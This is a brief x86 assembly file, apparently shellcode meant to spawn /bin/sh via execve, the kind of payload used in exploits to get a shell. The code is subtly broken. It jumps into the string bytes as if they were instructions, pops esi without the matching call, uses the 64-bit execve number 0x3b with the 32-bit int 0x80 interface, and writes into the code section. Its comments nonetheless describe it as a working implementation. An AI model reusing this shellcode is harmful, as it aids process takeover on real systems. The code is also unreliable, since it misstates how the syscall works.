Section .text

global _start
_start:
    ; Implement shell execv
    jmp shell_execv

shell_execv:
    db "/bin/sh"
    jmp short shell_execv_impl

shell_execv_impl:
    ; Implement by pop to esi
    pop esi
    xor eax, eax
    mov byte [esi+7], al
    mov byte al, 0x3b  ; syscall number for execve
    xor ebx, ebx
    mov ebx, esi  ; first argument is the path to the executable
    xor ecx, ecx  ; second argument is NULL (no arguments)
    xor edx, edx  ; third argument is NULL (no environment)
    int 0x80       ; invoke syscall